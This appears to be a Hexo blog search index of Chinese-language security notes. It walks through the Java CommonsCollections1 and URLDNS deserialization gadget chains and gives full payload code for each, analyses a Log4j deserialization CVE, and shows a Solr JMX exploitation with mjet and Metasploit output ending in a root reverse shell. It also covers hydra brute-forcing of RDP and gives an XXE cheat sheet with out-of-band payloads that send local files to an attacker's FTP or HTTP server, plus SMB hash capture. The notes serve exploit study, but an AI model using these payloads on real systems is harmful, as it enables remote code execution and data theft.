<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title><![CDATA[Commonscollections1 反序列化]]></title>
    <url>%2F%2Fblog%2F1604562905880.html</url>
    <content type="text"><![CDATA[Commonscollections 系列反序列化学习 依赖环境12Commons Collections 3.1jdk7或jdk8 触发流程Payload1123456789101112131415ObjectInputStream.readObject() AnnotationInvocationHandler.readObject() Map(Proxy).setValue() TransformedMap.checkSetValue() ChainedTransformer.transform() ConstantTransformer.transform() InvokerTransformer.transform() Method.invoke() Class.getMethod() InvokerTransformer.transform() Method.invoke() Runtime.getRuntime() InvokerTransformer.transform() Method.invoke() Runtime.exec() 按照触发流程，调试分析，先看 InvokerTransformer 类： 存在一个构造方法接收3个参数，包括方法名，参数类，参数值，存在 transform 方法，接收的参数是某个类，然后反射调用这个类，并执行通过构造方法中所获得的方法，可以看到类、方法、参数都是从外部输入，也就是说能够执行任意类的含任意参数的任意方法。在看 ConstantTransformer 类： 构造方法是接收一个任意类，transform 方法是无论参数是什么，都会直接返回通过构造方法获得的任意类，接下来是 ChainedTransformer 类： 构造方法是接收一个 Transformer 类数组，transform 方法是依次执行 Transformer 类数组中每一个 Transformer 类的 transform 方法，且每一个transform 方法得到的返回值，都是后面的 transform 方法的参数。而前面说到 ConstantTransformer 类的 transform 方法无论参数是什么，都会直接返回通过构造方法获得的任意类。这就非常适合当作 Transformer 类数组的第一个元素。再加上 InvokerTransformer 类的 transform 方法能够执行任意类的含任意参数的任意方法,就能够构造出执行命令的点： payload：123456789Transformer[] transformers = &#123; new ConstantTransformer(Runtime.class), new InvokerTransformer("getMethod", new Class[]&#123; String.class, Class[].class&#125;, new Object[]&#123;"getRuntime", new Class[0] &#125;), new InvokerTransformer("invoke", new Class[]&#123; Object.class, Object[].class&#125;, new Object[]&#123; null ,new Object[0]&#125; ), new InvokerTransformer("exec",new Class[] &#123;String.class &#125;,new Object[] &#123;"open /Applications/Calculator.app"&#125;) &#125;;ChainedTransformer Chain = new ChainedTransformer(transformers);Chain.transform(1); &#125; 构造的 payload 也是非常巧妙，运用反射调用反射，仔细研究下的话，实际还是有点复杂的，需要对 Java 反射机制运用的非常熟练才行。一行一行分析:new ConstantTransformer(Runtime.class) 由之前的分析得出会返回 Runtime.class 并且作为参数会传入到下个 InvokerTransformer.transform 中，new InvokerTransformer(&quot;getMethod&quot;, new Class[]{ String.class, Class[].class}, new Object[]{&quot;getRuntime&quot;, new Class[0] }) 得到 Runtime.class 参数，这里注意的是，由于传入的是 Runtime.class 是类，而不是类实例，所以 input.getClass() 得到的是 java.lang.Class,而不是 java.lang.Runtime: 这也是我们无法直接通过反射调用 getRuntime 方法，而需要通过反射调用反射调用getRuntime 方法的原因。这里通过反射调用 getMethod 方法，参数是 getRuntime。最后调用 getMethod 方法时，因为 invoke 的第一个参数还是 Runtime.class。所以后面能正确执行 getRuntime 方法。 new InvokerTransformer(&quot;invoke&quot;, new Class[]{ Object.class, Object[].class}, new Object[]{ null ,new Object[0]})，这里就是通过反射调用 invoke 方法，执行前面的 getMethod 方法,相当于第二层反射，真正执行的是 getRuntime，最终返回 Runtime 实例。 new InvokerTransformer(&quot;exec&quot;,new Class[] {String.class },new Object[] {&quot;open /Applications/Calculator.app&quot;}) 最后执行 Runtime 实例的 exec 方法，执行系统命令。为了方便理解，抽象出来的代码：123Object a = Runtime.class.getClass().getMethod("getMethod",new Class[]&#123; String.class, Class[].class&#125;).invoke(Runtime.class,"getRuntime", new Class[0]);Object b = a.getClass().getMethod("invoke",new Class[]&#123; Object.class, Object[].class&#125;).invoke(a,new Object[]&#123; null ,new Object[0]&#125;);b.getClass().getMethod("exec",String.class ).invoke(b,"open /Applications/Calculator.app"); 看看其他大佬的图： 总的来说，第一层反射只是外壳，里面的通过反射调用 getRuntime 方法，获取 Runtime 实例是精华。大佬就是牛逼。继续分析，既然通过一顿操作知道了 ChainedTransformer.transform 能够执行命令，那么还需要找到能自动触发这行代码的地方。看到反序列化的利用链 TransformedMap.checkSetValue() 可以看到该方法，会执行 this.valueTransformer.transform(value) ，而 this.valueTransformer 可以通过 decorate 方法进行赋值，同时也可以传入一个 map类。 TransformedMap.decorate方法,预期是对Map类的数据结构进行转化，该方法有三个参数。第一个参数为待转化的Map对象，第二个参数为Map对象内的key要经过的转化方法，第三个参数为Map对象内的value要经过的转化方法。 所以这段按照要求进行如下构造：123456789101112Transformer[] transformers = &#123; new ConstantTransformer(Runtime.class), new InvokerTransformer("getMethod", new Class[]&#123; String.class, Class[].class&#125;, new Object[]&#123;"getRuntime", new Class[0] &#125;), new InvokerTransformer("invoke", new Class[]&#123; Object.class, Object[].class&#125;, new Object[]&#123; null ,new Object[0]&#125; ), new InvokerTransformer("exec", new Class[] &#123;String.class &#125;, new Object[] &#123;"open /Applications/Calculator.app"&#125;)&#125;;Transformer transformerChain = new ChainedTransformer(transformers);Map map = new HashMap();map.put("1", "2");Map transformedmap = TransformedMap.decorate(map, null, transformerChain); 现在只需找到在某个类的 readObject 方法中直接或者间接调用 TransformedMap.checkSetValue() 即可。直接看到反序列化利用链的 AnnotationInvocationHandler.readObject 方法： this.memberValues 和 this.type 都可以通过构造方法传入，也就是都是我们可控制的，this.memberValues 是 Map 类型，先不管前面的各种判断，假设都成立，定位到 $\color{rgb(255,0,0)}{var5.setValue}$，var5 就是传入 map 的一个 Entry 类，实际我们传入的是 map 的子类 TransformedMap, 而 TransformedMap 并没有 setValue 方法，所以往上追溯到其直接父类 AbstractInputCheckedMapDecorator: 可以看到，setValue 方法中，正好执行了 checkSetValue 方法，在父类中，checkSetValue 是抽象方法，所以会执行子类中的 checkSetValue ，也就是 TransformedMap.checkSetValue(),达到了我们想要的目的，至于具体如何执行到这个 setValue 方法，涉及到 Map 里的静态内部类 MapEntry、EntrySet和其他方法的联动，就不再赘述了。重新整理 payload,加上利用 AnnotationInvocationHandler.readObject的部分：1234567891011121314151617Transformer[] transformers = &#123; new ConstantTransformer(Runtime.class), new InvokerTransformer("getMethod", new Class[]&#123; String.class, Class[].class&#125;, new Object[]&#123;"getRuntime", new Class[0] &#125;), new InvokerTransformer("invoke", new Class[]&#123; Object.class, Object[].class&#125;, new Object[]&#123; null ,new Object[0]&#125; ), new InvokerTransformer("exec", new Class[] &#123;String.class &#125;, new Object[] &#123;"open /Applications/Calculator.app"&#125;)&#125;;Transformer transformerChain = new ChainedTransformer(transformers);Map map = new HashMap();map.put("1", "2");Map transformedmap = TransformedMap.decorate(map, null, transformerChain);Class clazz = Class.forName("sun.reflect.annotation.AnnotationInvocationHandler");Constructor cons = clazz.getDeclaredConstructor(Class.class,Map.class);cons.setAccessible(true);Object ins = cons.newInstance(注解类,transformedmap); 现在就剩下最后一个问题了，就是如何满足 readObject 中的各种条件，重新看到该方法： 从构造方法可以看出 this.type 是注解类，var2 = AnnotationType.getInstance(this.type) 是获取该注解类的详细信息，Map var3 = var2.memberTypes(); 获取该注解类的成员变量的名称及类型，这里需要对 java 的注解有个基本了解，以 javax.xml.ws.Action 这个注解为例，12345678910@Documented@Retention(RetentionPolicy.RUNTIME)@Target(ElementType.METHOD)public @interface Action &#123; //input是成员变量，String 是其类型，默认值是"" String input() default ""; String output() default ""; FaultAction[] fault() default &#123; &#125;;&#125; 接下来就是对传入的 this.memberValues 和 this.type 相互校验：123456789101112131415while(var4.hasNext()) &#123; Entry var5 = (Entry)var4.next(); // var6 是 传入 map 的 key 值 String var6 = (String)var5.getKey(); // var7 是根据 var6 取出的 注解成员变量的类， Class var7 = (Class)var3.get(var6); // var7 不为空，也就是说传入 map 的 key 必须是传入注解类的 成员变量名 if (var7 != null) &#123; Object var8 = var5.getValue(); //传入 map 的 value 值必须不是传入注解类的成员变量的类的实例化对象， if (!var7.isInstance(var8) &amp;&amp; !(var8 instanceof ExceptionProxy)) &#123; var5.setValue((new AnnotationTypeMismatchExceptionProxy(var8.getClass() + "[" + var8 + "]")).setMember((Method)var2.members().get(var6))); &#125; &#125;&#125; 很明显的看出传入的 map 类和注解类要满足相关的条件，假设传入的注解类是 javax.xml.ws.Action ,那么按照以上分析的要求，map 的操作可以是map.put(&quot;input&quot;, 1);。最终的 payload：1234567891011121314151617181920212223242526Transformer[] transformers = &#123; new ConstantTransformer(Runtime.class), new InvokerTransformer("getMethod", new Class[]&#123; String.class, Class[].class&#125;, new Object[]&#123;"getRuntime", new Class[0] &#125;), new InvokerTransformer("invoke", new Class[]&#123; Object.class, Object[].class&#125;, new Object[]&#123; null ,new Object[0]&#125; ), new InvokerTransformer("exec", new Class[] &#123;String.class &#125;, new Object[] &#123;"open /Applications/Calculator.app"&#125;)&#125;;Transformer transformerChain = new ChainedTransformer(transformers); Map map = new HashMap();map.put("input", 1); Map transformedmap = TransformedMap.decorate(map, null, transformerChain); Class clazz = Class.forName("sun.reflect.annotation.AnnotationInvocationHandler");Constructor cons = clazz.getDeclaredConstructor(Class.class,Map.class);cons.setAccessible(true);Object ins = cons.newInstance(javax.xml.ws.Action.class,transformedmap); try&#123; ObjectOutputStream outputStream = new ObjectOutputStream(new FileOutputStream("tmp.cer")); outputStream.writeObject(ins); outputStream.close(); ObjectInputStream inputStream = new ObjectInputStream(new FileInputStream("tmp.cer")); inputStream.readObject();&#125;catch(Exception e)&#123; e.printStackTrace();&#125; Payload212345678910111213141516ObjectInputStream.readObject() AnnotationInvocationHandler.readObject() Map(Proxy).entrySet() AnnotationInvocationHandler.invoke() LazyMap.get() ChainedTransformer.transform() ConstantTransformer.transform() InvokerTransformer.transform() Method.invoke() Class.getMethod() InvokerTransformer.transform() Method.invoke() Runtime.getRuntime() InvokerTransformer.transform() Method.invoke() Runtime.exec() 从 ChainedTransformer.transform() 往下之前都分析过了，直接看到 LazyMap.get() 在 get 方法中，当 map 不包含 key 时，会执行 this.factory.transform(key),其中 this.factory 是传入的 Transformer 类，这和下面的 ChainedTransformer 利用链就可以联动了。代码：12345678910111213Transformer[] transformers = &#123; new ConstantTransformer(Runtime.class), new InvokerTransformer(&quot;getMethod&quot;, new Class[]&#123; String.class, Class[].class&#125;, new Object[]&#123;&quot;getRuntime&quot;, new Class[0] &#125;), new InvokerTransformer(&quot;invoke&quot;, new Class[]&#123; Object.class, Object[].class&#125;, new Object[]&#123; null ,new Object[0]&#125; ), new InvokerTransformer(&quot;exec&quot;, new Class[] &#123;String.class &#125;, new Object[] &#123;&quot;open /Applications/Calculator.app&quot;&#125;) &#125;;Transformer transformerChain = new ChainedTransformer(transformers);Map innerMap = new HashMap();//调用 decorate 方法，返回 LazyMap 的实例Map lazyMap = LazyMap.decorate(innerMap, transformerChain);lazyMap.get(&quot;A&quot;); 接下来是 Map(Proxy).entrySet()这里需要些 Java 动态代理的知识。简单的说，就是使用 JDK 动态代理时，会调用动态代理类的 invoke 方法，而每一个动态代理类都必须要实现 InvocationHandler 这个接口,在看 AnnotationInvocationHandler ,就是一个动态代理类， 看到它的 invoke 方法，其中就有 Object var6 = this.memberValues.get(var4);，如果 this.memberValues 是构造好的 LazyMap 就能执行 LazyMap.get()了。如何完成动态代理呢？一般通过 Proxy 的 newProxyInstance 完成动态代理 public static Object newProxyInstance(ClassLoader loader, Class&lt;?&gt;[] interfaces, InvocationHandler h) throws IllegalArgumentException loader: 定义了由哪个ClassLoader对象来对生成的代理对象进行加载,interfaces: 将要给需要代理的对象提供一组什么接口，h: 要调用实现的那种接口中的方法，会跳转到由这个代理对象关联到的 handler 中的invoke方法去执行, 很明显，动态代理的 InvocationHandler 就是 AnnotationInvocationHandler 了。 继续看 AnnotationInvocationHandler.readObject 其中有 Map(Proxy).entrySet() 对应到了 this.memberValues.entrySet().iterator()，也可以从 AnnotationInvocationHandler 的构造方法可以看出 this.memberValues 是 Map 类。如果反序列化入口点只能是 AnnotationInvocationHandler 类的话，那么最明显的思路就是初始化 AnnotationInvocationHandler 类的 Map 是经过传入 lazyMap 的 AnnotationInvocationHandler 实例动态代理的 Map。稍微有点绕口，代码比较清晰。1234567891011121314151617Constructor handler_constructor = Class.forName("sun.reflect.annotation.AnnotationInvocationHandler").getDeclaredConstructor(Class.class,Map.class); handler_constructor.setAccessible(true);InvocationHandler map_handler = (InvocationHandler) //初始化AnnotationInvocationHandler，传入特殊构造的lazyMap//这个AnnotationInvocationHandler实例，是作为动态代理的handler，//所以，当执行代理对象的接口方法时，会关联到 handler 的 invoke 方法去执行handler_constructor.newInstance(Override.class,lazyMap); //使用之前的 handler 处理动态代理 Map 对象Map proxy_map = (Map) Proxy.newProxyInstance(ClassLoader.getSystemClassLoader(),new Class[]&#123;Map.class&#125;,map_handler); //这里的AnnotationInvocationHandler是作为反序列化readObject的入口点Constructor AnnotationInvocationHandler_Constructor = Class.forName("sun.reflect.annotation.AnnotationInvocationHandler").getDeclaredConstructor(Class.class,Map.class);AnnotationInvocationHandler_Constructor.setAccessible(true);InvocationHandler handler = (InvocationHandler)AnnotationInvocationHandler_Constructor.newInstance(Override.class,proxy_map); 完整 Payload1234567891011121314151617181920212223242526Transformer[] transformers = &#123; new ConstantTransformer(Runtime.class), new InvokerTransformer("getMethod", new Class[]&#123; String.class, Class[].class&#125;, new Object[]&#123;"getRuntime", new Class[0] &#125;), new InvokerTransformer("invoke", new Class[]&#123; Object.class, Object[].class&#125;, new Object[]&#123; null ,new Object[0]&#125; ), new InvokerTransformer("exec", new Class[] &#123;String.class &#125;, new Object[] &#123;"open /Applications/Calculator.app"&#125;)&#125;;Transformer transformerChain = new ChainedTransformer(transformers);HashMap innermap = new HashMap();Map lazyMap = LazyMap.decorate(innermap, transformerChain);//初始化AnnotationInvocationHandler，传入特殊构造的lazyMap//这个AnnotationInvocationHandler实例，是作为动态代理的handler，//所以，当执行代理对象的接口方法时，会关联到 handler 的 invoke 方法去执行Constructor handler_constructor = Class.forName("sun.reflect.annotation.AnnotationInvocationHandler").getDeclaredConstructor(Class.class,Map.class);handler_constructor.setAccessible(true);InvocationHandler map_handler = (InvocationHandler) handler_constructor.newInstance(Override.class,lazyMap); //创建第一个代理的handler//使用之前的 handler 处理动态代理 Map 对象Map proxy_map = (Map) Proxy.newProxyInstance(ClassLoader.getSystemClassLoader(),new Class[]&#123;Map.class&#125;,map_handler); //创建proxy对象//这里的AnnotationInvocationHandler是作为反序列化 readObject 的入口点Constructor AnnotationInvocationHandler_Constructor = Class.forName("sun.reflect.annotation.AnnotationInvocationHandler").getDeclaredConstructor(Class.class,Map.class);AnnotationInvocationHandler_Constructor.setAccessible(true);InvocationHandler handler = (InvocationHandler)AnnotationInvocationHandler_Constructor.newInstance(Override.class,proxy_map);]]></content>
      <categories>
        <category>Java代码审计</category>
      </categories>
      <tags>
        <tag>Java</tag>
        <tag>代码审计</tag>
        <tag>反序列化</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[URLDNS 反序列化]]></title>
    <url>%2F%2Fblog%2F1597283762460.html</url>
    <content type="text"><![CDATA[URLDNS 反序列化 触发流程利用链1234HashMap.readObject() HashMap.putVal() HashMap.hash() URL.hashCode() 调试分析，重点看到 HashMap#readObject 的 putVal 方法： 调用 hash() 来处理 key,看到 hash() 方法： 调用 key 的 hashCode() 方法，跳到 URL 类的 hashCode() 如果 hashCode 等于 -1 ,就会调用 handler.hashCode 方法，这里的 handler 是指 URLStreamHandler,来到 URLStreamHandler.hashCode 方法： 该方法对 http 协议的各个部分计算 hashCode，其中 getHostAddress 方法就是 DNS 的触发点。跟进该方法： 其中的 InetAddress.getByName(host) 方法对域名发起了 DNS 查询。 分析完反序列化原理，反过来推 payload.12345678HashMap&lt;URL, String&gt; hashMap = new HashMap&lt;URL, String&gt;(); // 创建HashMap，并在 key 处设置 URL 类URL url = new URL(&quot;http://xxx.xx.xx&quot;); //创建 URL 类Field f = Class.forName(&quot;java.net.URL&quot;).getDeclaredField(&quot;hashCode&quot;); //获取 URL 类的 hashCode 变量f.setAccessible(true); //设置权限hashMap.put(url, &quot;1&quot;); //放入 HashMapf.set(url, -1); //设置 HashCode 为-1，之前的分析，如果HashCode不是-1，不会调用 handler.hashCode 重新计算 HashCodeObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream(&quot;tmp.cer&quot;));oos.writeObject(hashMap); //序列化写入文件 最开始的设想是这样的，但是实际运行之后，发现会有2次 DNS 记录，分析原因是 hashMap.put(url, &quot;1&quot;); 这里同样会调用 putVal 方法，再走一遍上述流程， 所以在 put 之前也要更改 HashCode 为不是-1的值，这样就不会调用 handler.hashCode 计算 hashcode.最后的 payload：123456789HashMap&lt;URL, String&gt; hashMap = new HashMap&lt;URL, String&gt;(); // 创建HashMap，并在 key 处设置 URL 类URL url = new URL(&quot;http://xxx.xx.xx&quot;); //创建 URL 类Field f = Class.forName(&quot;java.net.URL&quot;).getDeclaredField(&quot;hashCode&quot;); //获取 URL 类的 hashCode 变量f.setAccessible(true); //设置权限f.set(url, -122); //HashCode不是-1，不会调用 handler.hashCode 重新计算 HashCode hashMap.put(url, &quot;1&quot;); //放入 HashMapf.set(url, -1); //设置 HashCode 为-1，之前的分析，如果HashCode不是-1，不会调用 handler.hashCode 重新计算 HashCode ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream(&quot;tmp.cer&quot;));oos.writeObject(hashMap); //序列化写入文件]]></content>
      <categories>
        <category>漏洞分析</category>
      </categories>
      <tags>
        <tag>Java</tag>
        <tag>反序列化</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[CVE-2019-17571]]></title>
    <url>%2F%2Fblog%2F1577679142463.html</url>
    <content type="text"><![CDATA[CVE-2019-17571/Apache Log4j 反序列化远程代码执行漏洞 用的是 Apache Log4j 1.2.17 版本，sink 在 org.apache.log4j.net.SocketNode 类中： 在构造函数中，传入 socket 传输的数据流，然后在 run 方法中直接调用 readObject() 反序列化。 查找在哪些类中会调用 SocketNode 类，发现 SocketServer、SimpleSocketServer 类中都有调用： 并且由于 SocketNode 是实现 Runnable 接口。所以通过 new Thread().start() 方法能执行其 run 方法造成反序列化代码执行漏洞。 复现漏洞可以通过调用 SocketServer、SimpleSocketServer 类，或者自己实现都可以。 当然，任意代码执行的话还需要调用其他可以的 gadget .比如 Jdk7u21、CommonsCollections1 之类的。]]></content>
      <categories>
        <category>漏洞分析</category>
      </categories>
      <tags>
        <tag>反序列化</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[攻击JMX RMI]]></title>
    <url>%2F%2Fblog%2F1575618238391.html</url>
    <content type="text"><![CDATA[以 Apache Solr 远程代码执行(CVE-2019-12409)为例。 安装下载 8.1.1 版本，结果发现在 solr.in.cmd 默认是 false ，只有在 solr.in.sh 默认才是 true，所以只有在 Linux 上才能触发。 在 bin 目录下运行 ./solr start 启动 solr 可以看到默认情况下 18983 是开启的 探测扫描端口1nmap -sV -p 18983 127.0.0.1 如果是未授权的话，可以直接连接1jconsole 127.0.0.1:18983 比较奇怪的是，用 msf 检测漏洞是否存在的时候，没有检测出来1use auxiliary/scanner/misc/java_rmi_server 用 nmap 脚本也没有检测出来1nmap --script=rmi-vuln-classloader -p 18983 127.0.0.1 尴尬…. 利用mjet下载 mjet.py 脚本。因为开启的 jmx 服务默认是不需要验证的，所以直接利用：123../jdk1.8/bin/java -jar jython-standalone-2.7.0.jar mjet.py 127.0.0.1 18983 install passwd http://127.0.0.1:8000 8000../jdk1.8/bin/java -jar jython-standalone-2.7.0.jar mjet.py 127.0.0.1 18983 command passwd &quot;whoami&quot; msf利用 exploit/multi/misc/java_jmx_server 模块 12345678910111213141516171819202122232425262728293031323334msf &gt; use java/meterpreter/reverse_tcpmsf payload(java/meterpreter/reverse_tcp) &gt; set LHOST 127.0.0.1LHOST =&gt; 127.0.0.1msf payload(java/meterpreter/reverse_tcp) &gt; set LPORT 4444LPORT =&gt; 4444msf payload(java/meterpreter/reverse_tcp) &gt; use exploit/multi/misc/java_jmx_servermsf exploit(multi/misc/java_jmx_server) &gt; set RHOST 127.0.0.1RHOST =&gt; 127.0.0.1msf exploit(multi/misc/java_jmx_server) &gt; set RPORT 18983RPORT =&gt; 18983msf exploit(multi/misc/java_jmx_server) &gt; run[!] You are binding to a loopback address by setting LHOST to 127.0.0.1. Did you want ReverseListenerBindAddress?[*] Started reverse TCP handler on 127.0.0.1:4444 [*] 127.0.0.1:18983 - Using URL: http://0.0.0.0:8080/ka4B2HQsM[*] 127.0.0.1:18983 - Local IP: http://172.16.65.171:8080/ka4B2HQsM[*] 127.0.0.1:18983 - Sending RMI Header...[*] 127.0.0.1:18983 - Discovering the JMXRMI endpoint...[+] 127.0.0.1:18983 - JMXRMI endpoint on 127.0.1.1:18983[*] 127.0.0.1:18983 - Proceeding with handshake...[+] 127.0.0.1:18983 - Handshake with JMX MBean server on 127.0.1.1:18983[*] 127.0.0.1:18983 - Loading payload...[*] 127.0.0.1:18983 - Replied to request for mlet[*] 127.0.0.1:18983 - Replied to request for payload JAR[*] 127.0.0.1:18983 - Executing payload...[*] 127.0.0.1:18983 - Replied to request for payload JAR[*] Sending stage (53837 bytes) to 127.0.0.1[*] Meterpreter session 1 opened (127.0.0.1:4444 -&gt; 127.0.0.1:40740) at 2019-12-06 14:20:04 +0800meterpreter &gt; shellProcess 1 created.Channel 1 created.iduid=0(root) gid=0(root) groups=0(root) 参考链接 Exploiting JMX RMI]]></content>
      <categories>
        <category>漏洞利用</category>
      </categories>
      <tags>
        <tag>反序列化</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[hydra问题]]></title>
    <url>%2F%2Fblog%2F1573541964775.html</url>
    <content type="text"><![CDATA[Kali2.0里面的hydra是8.6版本的，在测试爆破3389时，能够正常运行，但是爆不出测试机的正确密码。 问题在Kali2.0上用hydra测试爆破3389时，爆破不出测试机的正确密码。一直在跳：12345[STATUS] 1.00 tries/min, 5 tries in 00:00h, 0 to do in 03:00h, 1 active[STATUS] 0.83 tries/min, 5 tries in 00:00h, 0 to do in 03:00h, 1 active[STATUS] 0.56 tries/min, 5 tries in 00:00h, 0 to do in 03:00h, 1 active[STATUS] 0.36 tries/min, 5 tries in 00:00h, 0 to do in 03:00h, 1 active[STATUS] 0.33 tries/min, 5 tries in 00:00h, 0 to do in 03:00h, 1 active 不知道啥意思，反正是爆破不出来，肯定有问题。 尝试想着是不是版本太低了，升级了一下，把hydra升级到当时的最新版本：apt install hydra跑了之后结果是1[ERROR] Compiled without FREERDP2 support, module not available! emmm,貌似少了一个模块，本来想安装这个模块的，但是看了下，安装太慢，而且太麻烦了。1https://github.com/FreeRDP/FreeRDP 别人的安装记录1https://www.jianshu.com/p/86638f0e89d7 解决还是到处搜啊，在Google上搜索到了其他人提交的issue：I have error with [ERROR] Compiled without FREERDP2 support, module not available! 编译安装最新版hydra，如下：1234567git clone https://github.com/vanhauser-thc/thc-hydra.gitcd thc-hydrasudo apt install freerdp2-devmake clean./configuremakemake install 在kali2.0上测试成功。]]></content>
      <categories>
        <category>工具</category>
      </categories>
      <tags>
        <tag>hydra</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[XXE漏洞]]></title>
    <url>%2F%2Fblog%2F1561960885122.html</url>
    <content type="text"><![CDATA[最近经常碰到XXE漏洞，记录一下XXE的相关姿势和碰到的问题 Blind XXE payload通过ftp传输数据相关paylaod123456789101112131415161718192021222324252627282930313233343536373839404142434445request:&lt;?xml version=&quot;1.0&quot;?&gt;&lt;!DOCTYPE foo SYSTEM &quot;http://ip/111.dtd&quot;&gt;111.dtd:&lt;!ENTITY % payload SYSTEM &quot;file:///c:/windows/win.ini&quot;&gt;&lt;!ENTITY % int &quot;&lt;!ENTITY &amp;#37; trick SYSTEM &apos;ftp://fakeuser:fakepass@ip/%payload;&apos;&gt;&quot;&gt;%int;%trick;-----------------------request:&lt;?xml version=&quot;1.0&quot;?&gt;&lt;!DOCTYPE ANY[&lt;!ENTITY % file SYSTEM &quot;file:///C:/1.txt&quot;&gt;&lt;!ENTITY % remote SYSTEM &quot;http://192.168.150.1/evil.xml&quot;&gt;%remote; %all;%send;]&gt;evil.xml:&lt;!ENTITY % all &quot;&lt;!ENTITY % send SYSTEM &apos;http://192.168.150.1/1.php?file=%file;&apos;&gt;&quot;&gt;&lt;!ENTITY % all &quot;&lt;!ENTITY % send SYSTEM &apos;ftp://ip:8089/%file;&apos;&gt;&quot;&gt;-----------------------request:&lt;?xml version=&quot;1.0&quot;?&gt;&lt;!DOCTYPE foo SYSTEM &quot;http://ip/111.dtd&quot;&gt;111.dtd&lt;!ENTITY % payload SYSTEM &quot;file:///c:/Windows/win.ini&quot;&gt;&lt;!ENTITY % int &quot;&lt;!ENTITY &amp;#37; trick SYSTEM &apos;ftp://ip:8089/%payload;&apos;&gt;&quot;&gt;%int;%trick; 伪装ftp服务方法一：1234567891011121314151617181920212223242526272829303132333435363738394041421.pyimport sockethost = &quot;0.0.0.0&quot;port = 2121sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)sock.bind((host, port))sock.listen(1)print &apos;waiting for connection...&apos;(client_sock, client_addr) = sock.accept()client_sock.send(&quot;220 test\r\n&quot;)print &apos;start&apos;while True: msg = client_sock.recv(1024) msg = msg.rstrip() if msg == &quot;&quot;: print &apos;connection end&apos; break else: if msg.startswith(&quot;USER &quot;): client_sock.send(&quot;331 user \r\n&quot;) print &quot;echo : %s&quot; % msg elif msg.startswith(&quot;PASS &quot;): client_sock.send(&quot;230 pass\r\n&quot;) print &quot;echo : %s&quot; % msg elif msg.startswith(&quot;TYPE &quot;): client_sock.send(&quot;200 mode\r\n&quot;) print &quot;echo : %s&quot; % msg else: client_sock.send(&quot;200 OK\r\n&quot;) print &quot;echo : %s&quot; % msgclient_sock.close()sock.close() 方法二：1python -m pyftpdlib -p 21 方法三：1231.rbhttps://raw.githubusercontent.com/ONsec-Lab/scripts/master/xxe-ftp-server.rb 方法四1234567891011121314151617181920211.rbrequire &apos;socket&apos;server = TCPServer.new 2121loop do Thread.start(server.accept) do |client| puts &quot;New client connected&quot; data = &quot;&quot; client.puts(&quot;220 xxe-ftp-server&quot;) loop &#123; req = client.gets() puts &quot;&lt; &quot;+req if req.include? &quot;USER&quot; client.puts(&quot;331 password please - version check&quot;) else #puts &quot;&gt; 230 more data please!&quot; client.puts(&quot;230 more data please!&quot;) end &#125; endend 读取的文件Linux12345/etc/passwd/etc/hosts/etc/environment/etc/host.conf/sys/power/image_size Windows12c:/Windows/debug/mrt.logc:/boot.ini XXE TO RCE实战中未成功，成功了在详细记录。 paylaod12345678910request:&lt;?xml version=&quot;1.0&quot;?&gt;&lt;!DOCTYPE foo SYSTEM &quot;http://ip/1111.dtd&quot;&gt;1111.dtd:&lt;!ENTITY % int &quot;&lt;!ENTITY &amp;#37; trick SYSTEM &apos;\\ip/1.txt&apos;&gt;&quot;&gt;%int;%trick; 伪装smb服务12https://github.com/SpiderLabs/Responder./Responder.py -I ens3 -v 案例及姿势12345678https://medium.com/@canavaroxum/xxe-on-windows-system-then-what-76d571d66745https://blog.csdn.net/weixin_34368949/article/details/88116535https://0xdf.gitlab.io/2019/01/13/getting-net-ntlm-hases-from-windows.htmlhttps://3gstudent.github.io/3gstudent.github.io/Windows%E4%B8%8B%E7%9A%84%E5%AF%86%E7%A0%81hash-Net-NTLMv1%E4%BB%8B%E7%BB%8D/https://pentestlab.blog/tag/smb-relay/https://medium.com/@petergombos/lm-ntlm-net-ntlmv2-oh-my-a9b235c58ed4http://www.it610.com/article/2378687.htmhttps://www.4hou.com/web/12964.html 工具12https://github.com/SpiderLabs/Responderhttps://github.com/SecureAuthCorp/impacket 注意事项 一、java中部分jdk能通过http获取多行数据 二、jdk1.7以上不能使用gopher://协议并且修复了HttpClient class，只能使用ftp传数据。 三、jdk1.8.0_141以上无法用ftp读取文件，之前版本未测试，遇到再更新 四、jdk Version &gt;7u141 and &gt;8u162 无法用ftp读取文件参考链接 https://www.freebuf.com/articles/web/195899.html https://www.mbsd.jp/blog/20171213.html https://github.com/JoyChou93/java-sec-code/wiki/XXE https://web-in-security.blogspot.com/2016/03/xxe-cheat-sheet.html https://skavans.ru/en/2017/12/02/xxe-oob-extracting-via-httpftp-using-single-opened-port/ http://lab.onsec.ru/2014/06/xxe-oob-exploitation-at-java-17.html https://gist.github.com/staaldraad/01415b990939494879b4 https://blog.netspi.com/forcing-xxe-reflection-server-error-messages/ https://www.radebit.com/web/article/2702.html https://medium.com/@alt3kx/out-of-band-xml-external-entity-oob-xxe-exploitation-over-fortify-software-security-center-ssc-1d5c7169b561 https://media.blackhat.com/eu-13/briefings/Osipov/bh-eu-13-XML-data-osipov-wp.pdf https://www.slideshare.net/ssuserf09cba/xxe-how-to-become-a-jedi https://www.kieranclaessens.be/cscbe-web-2018.html https://medium.com/@canavaroxum/xxe-on-windows-system-then-what-76d571d66745 https://xz.aliyun.com/t/3357 https://xz.aliyun.com/t/3601 https://blog.h3xstream.com/2014/06/identifying-xml-external-entity.html]]></content>
      <categories>
        <category>漏洞利用</category>
      </categories>
      <tags>
        <tag>XXE</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[FastJson反序列化RCE]]></title>
    <url>%2F%2Fblog%2F1561704300515.html</url>
